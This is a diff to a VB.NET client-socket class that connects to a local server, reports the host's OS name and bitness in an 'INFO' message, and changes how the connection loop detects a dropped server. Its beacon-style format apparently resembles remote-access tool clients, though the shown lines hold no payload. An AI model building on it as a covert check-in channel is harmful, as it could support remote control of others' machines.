@@ -16,13 +16,11 @@ Public Class ClientSocket
 
         Threading.Thread.Sleep(1000)
 
+        'InterNetworkV6
         S = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
 
         Dim ipAddress As IPAddress = IPAddress.Parse("127.0.0.1")
         Dim ipEndPoint As IPEndPoint = New IPEndPoint(ipAddress, 2020)
-
-        S.ReceiveTimeout = -1
-        S.SendTimeout = S.ReceiveTimeout
 
         S.ReceiveBufferSize = 1024 * 5000
         S.SendBufferSize = S.ReceiveBufferSize
@@ -35,7 +33,7 @@ Public Class ClientSocket
             MS = New MemoryStream
 
             Dim OS As New Devices.ComputerInfo
-            Send(String.Concat("INFO", SPL, "SYNC SOCKET", SPL, OS.OSFullName, Environment.OSVersion.ServicePack, " ", Environment.Is64BitOperatingSystem.ToString.Replace("False", "32bit").Replace("True", "64bit")))
+            Send(String.Concat("INFO", SPL, "SYNC", SPL, OS.OSFullName, Environment.OSVersion.ServicePack, " ", Environment.Is64BitOperatingSystem.ToString.Replace("False", "32bit").Replace("True", "64bit")))
 
             Read()
 
@@ -56,12 +54,16 @@ Public Class ClientSocket
 
                 i += 1
 
-                If i = 1000 Then
-                    Diagnostics.Debug.WriteLine("Checking Server")
+                If i > 300 Then
                     i = 0
-                    Send("alive?")
+                    If S.Poll(0, SelectMode.SelectRead) And S.Available <= 0 Then
+                        Exit While
+                    End If
                 End If
 
+                If isConnected = False OrElse Not S.Connected Then
+                    Exit While
+                End If
 
                 If S.Available > 0 Then
 
@@ -125,7 +127,7 @@ re:
     End Sub
 
     Private Shared Sub Send(ByVal b As Byte())
-        Dim MS As MemoryStream = New MemoryStream
+        Dim MS As MemoryStream = New IO.MemoryStream
         Try
             MS.Write(b, 0, b.Length)
             MS.Write(SB(EOF), 0, EOF.Length)
